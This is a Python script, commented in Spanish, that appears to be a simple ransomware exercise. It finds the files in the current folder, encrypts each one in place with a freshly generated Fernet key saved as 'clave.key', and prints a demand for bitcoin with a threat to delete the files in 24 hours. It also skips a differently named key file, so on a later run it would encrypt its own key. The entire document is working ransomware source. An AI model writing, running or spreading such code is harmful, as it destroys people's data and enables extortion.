#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Bucle para buscar archivos
files = []
for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

#Crear clave de encriptación que se usará para cifrar los archivos
key = Fernet.generate_key()

#Se guarda la clave en un archivo llamado "clave.key"
with open("clave.key", "wb") as clave:
	clave.write(key)

#Luego se usa un bucle que va por cada archivo encontrado para luego encriptarlo
#con la llave creada antes
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)



print("Todos sus archivos han sido encriptados, envie bitcoin o se borrarán en 24 horas!")
